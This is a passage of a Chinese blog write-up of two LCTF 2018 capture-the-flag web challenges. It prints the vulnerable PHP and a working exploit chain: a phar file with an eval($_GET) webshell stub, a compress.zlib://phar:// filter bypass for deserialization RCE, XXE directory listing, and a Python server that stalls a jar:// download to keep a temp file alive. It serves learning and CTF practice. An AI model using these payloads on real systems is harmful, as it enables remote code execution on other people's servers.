</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|read_secret|history|class)/i'</span>, <span class="keyword">$this</span>-&gt;file_path))&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry Sorry Sorry"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    <span class="keyword">include_once</span>(<span class="keyword">$this</span>-&gt;file_path); </span><br><span class="line"> &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $SECRET; </span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>]; </span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"md5"</span>, $data, $SECRET), $hmac) )&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    $data = unserialize($data); </span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar;                                               </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123; </span><br><span class="line">         <span class="keyword">if</span>(preg_match(<span class="string">'/^(http|https).*/i'</span>, $_GET[<span class="string">'url'</span>]))&#123; </span><br><span class="line">            $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);                         </span><br><span class="line">            <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)&#123; </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"Fuck off"</span>); </span><br><span class="line">            &#125; </span><br><span class="line">            file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data); </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Upload OK"</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker"</span>); </span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Miss the URL~~"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> ( !is_dir($path) || !file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;             </span><br><span class="line">        $path = <span class="string">"/var/www"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    header(<span class="string">"Content-Type: image/gif"</span>); </span><br><span class="line">    <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));                     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($path)</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i'</span>,$_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker Hacker Hacker"</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            $file_path = $_GET[<span class="string">'c'</span>]; </span><br><span class="line">            <span class="keyword">list</span>($width, $height, $type) = @getimagesize($file_path); </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Width is ："</span> . $width.<span class="string">" px&lt;br&gt;"</span> . </span><br><span class="line">                <span class="string">"Height is ："</span> . $height.<span class="string">" px&lt;br&gt;"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">list</span>($width, $height, $type) = @getimagesize($path.<span class="string">"/avatar.gif"</span>); </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Width is ："</span> . $width.<span class="string">" px&lt;br&gt;"</span> . </span><br><span class="line">            <span class="string">"Height is ："</span> . $height.<span class="string">" px&lt;br&gt;"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span><span class="params">($source_path,$dest_name)</span></span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $FILEBOX; </span><br><span class="line">    $dest_path = $FILEBOX . <span class="string">"/"</span> . $dest_name; </span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i'</span>,$source_path))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Hacker Hacker Hacker"</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(copy($source_path,$dest_path))&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Successful copy"</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Copy failed"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>)&#123; </span><br><span class="line">     upload(check_session()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>)&#123; </span><br><span class="line">    show(check_session()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"check"</span>)&#123; </span><br><span class="line">    check(check_session()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($mode == <span class="string">"move"</span>)&#123; </span><br><span class="line">    move($_GET[<span class="string">'source'</span>],$_GET[<span class="string">'dest'</span>]); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123;      </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./comments.html"</span>);</span><br></pre></td></tr></table></figure>
+<p>重点放在upload和check函数上，可以直接从过滤中看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i'</span>,$_GET[<span class="string">'c'</span>]))</span><br></pre></td></tr></table></figure>
+<p>check中禁用了一些php的伪协议，尤其是<code>phar</code>，但是这里可以通过<code>compress.zlib://phar:</code>方式绕过</p>
+<p>然后后面通过<code>@getimagesize($file_path)</code>就可以触发phar反序列化</p>
+<p>phar文件自然是通过<code>upload</code>方式传上去的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(http|https).*/i'</span>, $_GET[<span class="string">'url'</span>]))&#123; </span><br><span class="line">    $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);                         </span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Fuck off"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br></pre></td></tr></table></figure>
+<p>可以看到是只要文件头以<code>GIF89a</code>开头，然后就可以从远程服务器中下载图片到自己的data沙箱中</p>
+<p>于是构造phar文件（文件路径在cookie中可以看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n_secret_flag</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file_path = <span class="string">'/var/www/html/show_me_shell/data/8296a7decb7606bc224d78d13afaf8df/avatar.gif'</span>;</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a&lt;?php echo 1;eval($_GET["a"]);?&gt;&lt;?php __HALT_COMPILER(); ?&gt;'</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> K0rz3n_secret_flag();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>然后改名为<code>avatar.gif</code>让题目下载就可以了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/6.png" alt></p>
+<p>下载到之后，就可以利用phar进行反序列化</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">85.128</span><span class="regexp">/show_me_shell/</span>html<span class="regexp">/LCTF.php?m=check&amp;c=compress.zlib:/</span><span class="regexp">/phar:/</span><span class="regexp">//</span>var<span class="regexp">/www/</span>html<span class="regexp">/show_me_shell/</span>data<span class="regexp">/8296a7decb7606bc224d78d13afaf8df/</span>avatar.gif<span class="regexp">/test.txt&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure>
+<p>就可以rce了，第一题也就到这结束了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/7.png" alt></p>
+<h1 id="sh31l-4ga1n"><a href="#sh31l-4ga1n" class="headerlink" title="sh31l 4ga1n"></a>sh31l 4ga1n</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>第一题的升级版，最主要的一个特征就是，在<code>K0rz3n_secret_fla</code>类中过滤了<code>data</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n_secret_flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $file_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|data|read_secret|history|class|\.\.)/i'</span>, <span class="keyword">$this</span>-&gt;file_path))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry Sorry Sorry"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="keyword">$this</span>-&gt;file_path);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样就不能反序列化<code>data</code>目录下的文件，move也不能移动<code>data</code>目录下的文件，至于非预期解的问题最后再说，因为预期解中有蛮多值得学习的地方还是</p>
+<p>在留言的部分抓包后可以发现其实是往8080的一个api目录发送的数据包</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/8.png" alt></p>
+<p>8080一般是tomcat的默认端口，我们可以猜测这是一个java服务。对json的数据进行了一些过滤，但是我们可以尝试直接发送一个xml（注意改下<code>Content-Type</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/9.png" alt></p>
+<p>发现也是可以解析的，虽然不能用<code>file</code>协议，但是可以利用外部实体，列目录（出题人是用的netdoc协议，但是本地貌似没有这个协议</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/10.png" alt></p>
+<h2 id="jar协议"><a href="#jar协议" class="headerlink" title="jar协议"></a>jar协议</h2><p>由于提示了需要getshell，已经把flag放在了一个比较隐藏的目录中，需要要一些系统命令来查找flag</p>
+<p>然后就是一个getshell的思路</p>
+<blockquote>
+<p>java 的 jar:// 协议，通过这个协议我们能向远程服务器去请求文件（没错是一个远程的文件，这相比于 php 的 phar 只能请求本地文件来说要强大的多），并且在传输过程中会生成一个临时文件在某个临时目录中</p>
+</blockquote>
+<p>可以利用jar协议，请求一个远程文件，并会生成一个tmp文件，但是和php一样，这个tmp文件只在这次请求的周期中存在，并且不可预测。</p>
+<p>但是我们这里有一个列目录的功能，我们可以通过XXE来获取到文件名，但是还有个小问题就是，一次请求的时间相当短，难以在这极短的时间内完成文件的move。这里出题人给出了这样一个思路</p>
+<blockquote>
+<p>实际上我们可以通过自己写服务器端的方法完成这个功能，因为文件本身就在自己的服务器上，我想让他怎么传不是完全听我的？于是我写了一个简单的 TCP 服务器，这个服务器的特点就是在传输到文件的最后一个字节的时候突然暂停传输，我使用的是 sleep() 方法，这样就延长了时间，而且是任意时间的延长，但是实际上这厉害牵扯出一个问题，就是我们这样做文件实际上是不完整的，所以我们需要精心构造一个 payload 文件，这个文件的特点就是我在最后一个字节的后面又添加了一个垃圾字节，这样实际上在暂停过程中文件已经传输完毕了，只是服务器认为没有成功传输而已</p>
+</blockquote>
+<p>只要自己利用socket伪造一个文件传输器，发送完phar部分的文件之后，就进入阻塞，这也就可以把这次请求的周期极大的放大。就有足够的时间给我们转移文件，进而反序列化getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote </span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc </span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">'0.0.0.0'</span> </span><br><span class="line">listen_port = <span class="number">23333</span></span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarRequestHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        http_req = <span class="string">b''</span></span><br><span class="line">        print(<span class="string">'New connection:'</span>,self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b'\r\n\r\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += self.request.recv(<span class="number">4096</span>)</span><br><span class="line">                print(<span class="string">'\r\nClient req:\r\n'</span>,http_req.decode())</span><br><span class="line">                jf = open(jar_file, <span class="string">'rb'</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">'''HTTP/1.0 200 OK\r\n'''</span></span><br><span class="line">                <span class="string">'''Content-Type: application/java-archive\r\n\r\n'''</span>)</span><br><span class="line">                self.request.sendall(headers.encode(<span class="string">'ascii'</span>))</span><br><span class="line">                self.request.sendall(contents[:<span class="number">-1</span>])</span><br><span class="line">                time.sleep(<span class="number">300</span>)</span><br><span class="line">                print(<span class="number">30</span>)</span><br><span class="line">                self.request.sendall(contents[<span class="number">-1</span>:])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"get error at:"</span>+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'waiting for connection...'</span>) </span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon = <span class="literal">True</span> </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure>
+<p>需要在phar文件末尾添加一些额外字符</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/11.png" alt></p>
+<p>然后放在服务器中进行请求</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/1.gif" alt></p>
+<p>就可以找到临时文件名，然后利用move函数进行转移</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.85.144/again/html/LCTF.php</span></span><br><span class="line">?m=move</span><br><span class="line"><span class="variable">&amp;source</span>=<span class="meta-keyword">/tmp/</span>tomcat8-tomcat8-tmp/jar_cache10508780857600852519.tmp</span><br><span class="line"><span class="variable">&amp;dest</span>=jar.zip</span><br></pre></td></tr></table></figure>
+<p>emm，本地复现的时候遇到了一个小问题就是，apache的用户是<code>www-data</code>，tomcat的运行用户是<code>tomcat</code>这样就导致无法利用php移动tomcat的临时文件，不过比赛的时候应该权限已经配好了把。</p>
+<p>到这后面也就差不多了，文件被移动到file目录下之后，就和之前一样phar反序列化包含就行了</p>
+<h2 id="一些非预期"><a href="#一些非预期" class="headerlink" title="一些非预期"></a>一些非预期</h2><p>第一题的非预期似乎是没有注意到cookie中可以获取到文件的路径，所以可以看到第一题中很多功能都没用到</p>
+<p>第二题的话听说一开始将<code>$SECRET</code>设置成了一个NULL值，就可以伪造签名，从而getshell了</p>
+<p>而且我也觉得XXE之后真的要getshell，我也会去尝试读取<code>read_secret</code>文件内容，反正DTD在我远程服务器，也不受什么限制，进而伪造签名</p>
+<p>但是预期解中还是有很多值得学习的地方的，但是感觉可能因为写的有点偏复杂了，就导致了很多没有预期到的结果。总之还是很值得学习的一道题。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>一开始打的时候真的打自闭了，和劝退赛一样，不过赛后确实学到了很多东西，膜一波l-team的师傅们</p>
+<p>自己真的还差的很远，接下来两件事</p>
+<ul>
+<li>学java</li>
+<li>学会看文档</li>
+</ul>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/#footer" target="_blank" rel="noopener">http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/#footer</a></p>
+<p><a href="https://xz.aliyun.com/t/3341#toc-20" target="_blank" rel="noopener">https://xz.aliyun.com/t/3341#toc-20</a></p>
+<p><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/11/Code-Breaking-Puzzles-题解-学习篇/" data-toggle="tooltip" data-placement="top" title="Code-Breaking Puzzles 题解&学习篇">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/11/hctf2018-web-writeup/" data-toggle="tooltip" data-placement="top" title="hctf2018-web writeup">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                          <a class="tag" href="/tags/#lctf" title="lctf">lctf</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
